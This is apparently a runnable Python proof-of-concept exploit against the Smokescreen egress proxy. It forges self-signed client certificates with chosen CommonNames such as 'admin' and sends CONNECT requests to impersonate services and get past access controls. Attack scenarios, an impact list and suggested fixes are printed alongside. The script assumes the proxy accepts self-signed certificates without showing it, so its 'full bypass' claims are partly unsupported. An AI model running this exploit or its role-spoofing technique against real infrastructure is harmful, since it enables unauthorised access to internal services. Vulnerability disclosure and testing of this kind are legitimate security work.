#!/usr/bin/env python3
"""
POC: Smokescreen Certificate CN Authentication Bypass
=====================================================

VULNERABILITY: Client certificate CommonName used as service role without validation
SEVERITY: HIGH
CODE: main.go lines 12-24

DESCRIPTION:
The defaultRoleFromRequest() function extracts the role directly from
the client certificate's CommonName field without validation.

An attacker can:
  1. Create a certificate with arbitrary CommonName
  2. Request access as any service (admin, api, webhook, etc.)
  3. Proxy trusts the CN and uses it as the role
  4. If combined with open/report ACL policies, gets full access

VULNERABLE CODE:
  main.go:16-24
  func defaultRoleFromRequest(req *http.Request) (string, error) {
      return req.TLS.PeerCertificates[0].Subject.CommonName, nil
  }

The CommonName is user-controlled (set in CSR) and not validated.
"""

import subprocess
import socket
import ssl
import sys
from typing import Tuple

class CNCertBypassPOC:
    def __init__(self, proxy_host: str, proxy_port: int):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
    
    def generate_cert_with_cn(self, cn: str, cert_file: str, key_file: str) -> bool:
        """Generate self-signed cert with arbitrary CommonName"""
        try:
            cmd = [
                "openssl", "req", "-x509", "-newkey", "rsa:2048", "-days", "1",
                "-nodes", "-out", cert_file, "-keyout", key_file,
                "-subj", f"/CN={cn}"
            ]
            subprocess.run(cmd, capture_output=True, check=True, timeout=10)
            return True
        except Exception as e:
            print(f"Error generating cert: {e}")
            return False
    
    def test_with_cn(self, cn: str, target_host: str, target_port: int) -> Tuple[bool, str]:
        """Test proxy with certificate using specific CN"""
        cert_file = f"/tmp/test_{cn.replace('/', '_')}.pem"
        key_file = f"/tmp/test_{cn.replace('/', '_')}_key.pem"
        
        if not self.generate_cert_with_cn(cn, cert_file, key_file):
            return False, "Failed to generate certificate"
        
        try:
            context = ssl.create_default_context()
            context.load_cert_chain(certfile=cert_file, keyfile=key_file)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((self.proxy_host, self.proxy_port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.proxy_host) as ssock:
                    connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
                    connect_request += f"Host: {target_host}:{target_port}\r\n"
                    connect_request += "Connection: close\r\n\r\n"
                    
                    ssock.sendall(connect_request.encode())
                    response = ssock.recv(4096).decode('utf-8', errors='ignore')
                    
                    if "200" in response.split('\n')[0]:
                        return True, f"✓ ALLOWED with CN={cn}"
                    else:
                        return False, f"✗ DENIED with CN={cn}"
        except Exception as e:
            return False, f"✗ ERROR: {str(e)}"
    
    def run(self):
        print("\n" + "="*70)
        print("POC3: CERTIFICATE CN AUTHENTICATION BYPASS (HIGH)")
        print("="*70)
        
        print("\nVULNERABLE CODE:")
        print("""
main.go:16-24
func defaultRoleFromRequest(req *http.Request) (string, error) {
    if len(req.TLS.PeerCertificates) == 0 {
        return "", errors.New("no certificate")
    }
    // Directly uses CN as role - NO VALIDATION
    return req.TLS.PeerCertificates[0].Subject.CommonName, nil
}
        """)
        
        print("\nVULNERABILITY:")
        print("  - CommonName is set by the certificate requester")
        print("  - No validation of CN value")
        print("  - Attacker can create cert with arbitrary CN")
        print("  - Proxy trusts CN as the service identity")
        print("  - If ACL allows unknown services → full bypass")
        
        print("\n" + "-"*70)
        print("ATTACK SCENARIOS")
        print("-"*70)
        
        print("\nSCENARIO 1: Impersonate privileged service")
        print("  1. Attacker creates cert with CN=admin")
        print("  2. Proxy extracts role=admin from certificate")
        print("  3. If admin has 'open' policy → full access")
        print("  4. Attacker can CONNECT to any external service")
        
        print("\nSCENARIO 2: Bypass default rule")
        print("  1. Config has default_rule: enforce (deny all)")
        print("  2. But also has global_allow_list: [*.example.com]")
        print("  3. Attacker creates cert with CN=internal-api")
        print("  4. Spoofs role → ACL decision uses wrong role")
        print("  5. Can bypass access controls")
        
        print("\nSCENARIO 3: AllowMissingRole combined with CN spoofing")
        print("  1. Config: allow_missing_role: true")
        print("  2. Default rule: open")
        print("  3. Attacker creates any cert")
        print("  4. Proxy allows access with fabricated role")
        
        print("\n" + "-"*70)
        print("TESTING CN BYPASS")
        print("-"*70)
        
        test_cases = [
            ("legitimate-service", "example.com", 443),
            ("admin", "example.com", 443),
            ("webhook", "example.com", 443),
        ]
        
        for cn, host, port in test_cases:
            print(f"\n[TEST] Using CN={cn} to access {host}:{port}")
            success, msg = self.test_with_cn(cn, host, port)
            print(f"  Result: {msg}")
            
            if success:
                print(f"  ⚠ Vulnerability: Attacker impersonated service with CN={cn}")
        
        print("\n" + "="*70)
        print("EXPLOITATION IMPACT")
        print("="*70)
        print("""
✓ Certificate subject (CN) is completely controlled by requester
✓ No validation that CN matches registered service
✓ Can impersonate any service in the system
✓ Defeats purpose of mTLS authentication
✓ If default policy is 'open' → complete bypass
✓ Combined with other vulns = full system compromise
        """)
        
        print("\nRECOMMENDED FIX:")
        print("""
1. Validate CN against list of allowed services
2. Use certificate fingerprints for identity
3. Check certificate extensions (custom OIDs)
4. Implement SPIFFE/SVID for proper identity binding
5. Use certificate pinning for critical services
        """)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("USAGE: python3 poc3_certificate_cn_auth_bypass.py <proxy_host> [port]")
        print("EXAMPLE: python3 poc3_certificate_cn_auth_bypass.py localhost 4750")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4750
    
    poc = CNCertBypassPOC(host, port)
    poc.run()
